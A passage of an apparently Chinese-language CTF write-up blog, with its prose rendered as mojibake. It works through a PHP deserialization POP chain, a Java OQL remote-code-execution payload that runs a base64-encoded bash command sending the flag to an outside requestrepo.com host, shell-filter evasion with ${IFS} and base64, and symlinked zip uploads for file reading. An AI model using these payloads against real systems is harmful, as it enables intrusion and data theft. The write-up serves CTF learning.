class="hljs-params"><span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/Test/&quot;</span>,<span class="hljs-title function_ invoke__">get_class</span>(<span class="hljs-variable">$this</span>-&gt;a)))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No test in Prod\n&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;begin&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;begin&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>popé“¾æ„é€ ï¼Œ<code>class B</code>ä¸­çš„<code>__destruct</code>ä¸ºå…¥å£æ–¹æ³•ï¼Œ<code>class Fun</code>ä¸­çš„<code>__call</code>ä¸ºæœ€ç»ˆæ–¹æ³•ã€‚å½“æ—¶ä¸€ç›´ä»¥ä¸ºè¦å»è°ƒç”¨<code>Test</code>ä¸­çš„<code>__call</code>å¯¼è‡´æ²¡åšå‡ºæ¥:(ç°åœ¨æƒ³æƒ³æ—¢ç„¶<code>Fun</code>ç±»ä¸‹éƒ½ç»™å›è°ƒå‡½æ•°äº†ç›´æ¥æ‰§è¡Œå‘½ä»¤å°±å¥½ï¼š</p><p><code>B</code> - &gt; <code>A</code> - &gt; <code>Fun </code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fun</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;call_user_func_array&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func,<span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span>);<br>&#125;<br>&#125;<br> <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/Test/&quot;</span>,<span class="hljs-title function_ invoke__">get_class</span>(<span class="hljs-variable">$this</span>-&gt;a)))&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No test in Prod\n&quot;</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>();<br>&#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>;<br>&#125;<br>&#125;<br> <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Fun</span>();<br><span class="hljs-variable">$a</span>-&gt;a=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$a</span>-&gt;p=<span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br><span class="hljs-variable">$b</span>-&gt;a=<span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>é¦–å…ˆå®ä¾‹åŒ–B,A,Funç±»ã€‚$aä¸­çš„aå±æ€§èµ‹å€¼ä¸ºBç±»çš„ä¸€ä¸ªå®ä¾‹ã€‚$açš„på±æ€§èµ‹å€¼ä¸ºphpinfoã€‚å› ä¸ºClass Aå¹¶æ²¡å£°æ˜på±æ€§ï¼Œå°±ä¼šè§¦å‘__get()é­”æœ¯æ–¹æ³•ã€‚ å› ä¸ºå­˜åœ¨<code>return $this-&gt;a-&gt;$p()</code>(ä¹Ÿå°±æ˜¯è°ƒç”¨Funå®ä¾‹çš„phpinfo()æ–¹æ³•ï¼Œä½†å¹¶ä¸å­˜åœ¨è¿™ä¸ªæ–¹æ³•)ä»è€Œè§¦å‘callé­”æœ¯æ–¹æ³•ã€‚<code>__call($f, $p)</code> æ–¹æ³•ä¸­ <code>$f</code> æ˜¯å°è¯•è°ƒç”¨çš„æ–¹æ³•åï¼Œè€Œ <code>$p</code> æ˜¯ä¼ é€’ç»™è¯¥æ–¹æ³•çš„å‚æ•°æ•°ç»„ï¼Œæœ€åå°±æˆäº†<code>call_user_func_array(&quot;phpinfo&quot;, null)</code>è¿™ä¹ˆä¸ªä¸œè¥¿ã€‚</p><h3 id="HGAME-jhat"><a href="#HGAME-jhat" class="headerlink" title="[HGAME]jhat"></a>[HGAME]jhat</h3><p><a href="https://blog.csdn.net/Jayjay___/">å‚è€ƒèµ„æ–™</a></p><p>åˆ©ç”¨OQLå®ç°RCE:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>CURLå¸¦å‡ºflag:<br>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å‘½ä»¤æ˜¯ç±»ä¼¼ï¼š<br>curl  http:<span class="hljs-regexp">//</span>`cat <span class="hljs-regexp">/flag`.i5yh54u0.requestrepo.com/</span><br></code></pre></td></tr></table></figure><p>ä½†æ³¨æ„Runtime.execä¸ä¼šè§£æShellå‘½ä»¤æˆ–Shellç‰¹æ€§ï¼ˆå¦‚ç®¡é“|ã€é‡å®šå‘&gt;ã€åå¼•å·ç­‰ï¼‰ã€‚å®ƒåªæ˜¯ç®€å•åœ°å°†æä¾›çš„å­—ç¬¦ä¸²ä½œä¸ºå‘½ä»¤æ‰§è¡Œï¼Œè€Œä¸ç»è¿‡Shellè§£é‡Šå™¨ï¼Œå› æ­¤æ— æ³•ç†è§£æˆ–æ‰§è¡ŒåµŒå…¥çš„å­å‘½ä»¤ã€‚è¦ä½¿ç”¨è¿™äº›ç‰¹æ€§ï¼Œéœ€è¦æ˜¾å¼åœ°è°ƒç”¨Shellå¹¶å°†æ•´ä¸ªå‘½ä»¤å­—ç¬¦ä¸²ä½œä¸ºShellå‘½ä»¤çš„ä¸€éƒ¨åˆ†ä¼ é€’ï¼Œä¾‹å¦‚ä½¿ç”¨bash -c â€œå‘½ä»¤â€æ˜¾å¼è°ƒç”¨Shellï¼Œå¹¶å°†æ•´ä¸ªå‘½ä»¤ä½œä¸ºå­—ç¬¦ä¸²ä¼ é€’ç»™Shellã€‚è¿™æ ·å°±å¯ä»¥åˆ©ç”¨Shellæ¥è§£æå’Œæ‰§è¡Œå¤æ‚çš„å‘½ä»¤è¡Œç‰¹æ€§ï¼ŒåŒ…æ‹¬ç®¡é“å’Œå‘½ä»¤æ›¿æ¢:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">&#x27;bash -c &#123;echo,Y3VybCAgaHR0cDovL2BjYXQgL2ZsYWdgLnRzY2Y1YjNkLnJlcXVlc3RyZXBvLmNvbS8=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&#x27;bash -c &#123;echo,Y3VybCAgaHR0cDovL2BjYXQgL2ZsYWdgLnRzY2Y1YjNkLnJlcXVlc3RyZXBvLmNvbS8=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="BeginCTF-readbooks"><a href="#BeginCTF-readbooks" class="headerlink" title="[BeginCTF]readbooks"></a>[BeginCTF]readbooks</h3><p><a href="https://blog.csdn.net/uuzeray/article/details/136032992">å‚è€ƒèµ„æ–™</a></p><p>æ ¹æ®è·¯ç”±<code>public/book1</code>,<code>public/book2</code>å¯ä»¥æ¨æµ‹æ˜¯è¯»å–æ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨<code>*</code>è¿™ä¸ªä¸œè¥¿å¯ä»¥å®ç°æ–‡ä»¶è¯»å–ï¼š</p><p><code>public/a*</code>(å»è¯»aå¼€å¤´çš„æ–‡ä»¶)ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#app.py:</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template<br><br>app = Flask(__name__)<br><br>DISALLOWED1 = [<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>]<br>DISALLOWED_FILES = [<span class="hljs-string">&#x27;app.py&#x27;</span>, <span class="hljs-string">&#x27;templates&#x27;</span>, <span class="hljs-string">&#x27;etc&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;blacklist&#x27;</span>]<br>BLACKLIST = [x[:-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./blacklist.txt&quot;</span>).readlines()][:-<span class="hljs-number">1</span>]<br><br>BLACKLIST.append(<span class="hljs-string">&quot;/&quot;</span>)<br>BLACKLIST.append(<span class="hljs-string">&quot;\\&quot;</span>)<br>BLACKLIST.append(<span class="hljs-string">&quot; &quot;</span>)<br>BLACKLIST.append(<span class="hljs-string">&quot;\t&quot;</span>)<br>BLACKLIST.append(<span class="hljs-string">&quot;\n&quot;</span>)<br>BLACKLIST.append(<span class="hljs-string">&quot;tc&quot;</span>)<br><br>ALLOW = [<br>    <span class="hljs-string">&quot;&#123;&quot;</span>,<br>    <span class="hljs-string">&quot;&#125;&quot;</span>,<br>    <span class="hljs-string">&quot;[&quot;</span>,<br>    <span class="hljs-string">&quot;pwd&quot;</span>,<br>    <span class="hljs-string">&quot;-&quot;</span>,<br>    <span class="hljs-string">&quot;_&quot;</span><br>]<br><br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> ALLOW:<br>    <span class="hljs-keyword">try</span>:<br>        BLACKLIST.remove(a)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/public/&lt;path:name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readbook</span>(<span class="hljs-params">name</span>):<br>    name = <span class="hljs-built_in">str</span>(name)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> DISALLOWED1:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> DISALLOWED_FILES:<br>        <span class="hljs-keyword">if</span> j <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> BLACKLIST:<br>        <span class="hljs-keyword">if</span> k <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span><br>    <span class="hljs-built_in">print</span>(name)<br>    <span class="hljs-keyword">try</span>:<br>        res = os.popen(<span class="hljs-string">&#x27;cat &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name)).read()<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/list/&lt;path:name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">listbook</span>(<span class="hljs-params">name</span>):<br>    name = <span class="hljs-built_in">str</span>(name)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> DISALLOWED1:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> DISALLOWED_FILES:<br>        <span class="hljs-keyword">if</span> j <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> BLACKLIST:<br>        <span class="hljs-keyword">if</span> k <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;banned!&quot;</span><br>    <span class="hljs-built_in">print</span>(name)<br>    cmd = <span class="hljs-string">&#x27;ls &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name)<br>    <span class="hljs-keyword">try</span>:<br>        res = os.popen(cmd).read()<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">8878</span>)<br></code></pre></td></tr></table></figure><p>æ€è·¯å°±æ˜¯é€šè¿‡<code>echo</code>å’Œå¼•å·&#x2F;åå¼•å·å®ç°å¯¹ç‰¹å®šæ–‡ä»¶çš„è¯»å–ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">`<span class="hljs-built_in">echo</span> /flag` -&gt; è¿‡æ»¤äº†<span class="hljs-built_in">echo</span>å’Œç©ºæ ¼<br>`ec<span class="hljs-string">&quot;&quot;</span>ho<span class="hljs-variable">$&#123;IFS&#125;</span>/flag` -&gt; è¿‡æ»¤äº†/åŠflag<br>`ec<span class="hljs-string">&quot;&quot;</span>ho<span class="hljs-variable">$&#123;IFS&#125;</span>L19mbGFn|<span class="hljs-string">&#x27;ba&#x27;</span><span class="hljs-string">&#x27;se64&#x27;</span><span class="hljs-variable">$&#123;IFS&#125;</span>-d` //flagä½äº/_flag<br></code></pre></td></tr></table></figure><h3 id="BeginCTF-zupload-pro-plus-max-ultra-premium"><a href="#BeginCTF-zupload-pro-plus-max-ultra-premium" class="headerlink" title="[BeginCTF]zupload-pro-plus-max-ultra-premium"></a>[BeginCTF]zupload-pro-plus-max-ultra-premium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;./upload&#x27;</span>));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$file_tmp</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_size</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$file_error</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file_ext</span>));<br>    <br>    <span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>) &amp;&amp; (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>())-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$file_tmp</span>) === <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_error</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_size</span> &lt;= <span class="hljs-number">2097152</span>) &#123;<br>                <span class="hljs-variable">$file_name_new</span> = <span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-literal">true</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file_ext</span>;<br>                <span class="hljs-variable">$file_destination</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$file_name_new</span>;<br>    <br>                <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file_tmp</span>, <span class="hljs-variable">$file_destination</span>)) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>                        <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>                        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Failed to upload file&#x27;</span><br>                    ));<br>                &#125;<br><br>                <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;unzip &#x27;</span> . <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$file_destination</span>) . <span class="hljs-string">&#x27; -d &#x27;</span> . <span class="hljs-string">&#x27;uploads/&#x27;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>                    <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,<br>                    <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,<br>                    <span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&#x27;/\?/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . <span class="hljs-variable">$file_destination</span><br>                ));<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>            <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Only zip files are allowed&#x27;</span><br>        ));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åå°è§£å‹ç¼©ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä½†åªèƒ½ä¸‹è½½ä¸èƒ½è®¿é—®</p><p>ä¸¤ç§è§£æ³•ï¼Œç¬¬ä¸€ç§å°±æ˜¯ä¸Šä¼ å®Œè½¯é“¾æ¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /flag myflag<br>zip --symlink 1.zip myflag<br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥è®¿é—®<code>uploads/myflag</code></p><p>ç¬¬äºŒç§è§£æ³•å°±æ˜¯å†™é©¬(CISCN2023 Unzip)</p><h3 id="BeginCTF-zupload-pro-plus-enhanced"><a href="#BeginCTF-zupload-pro-plus-enhanced" class="headerlink" title="[BeginCTF]zupload-pro-plus-enhanced"></a>[BeginCTF]zupload-pro-plus-enhanced</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: /?action=upload&#x27;</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;/&#x27;</span>) &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid 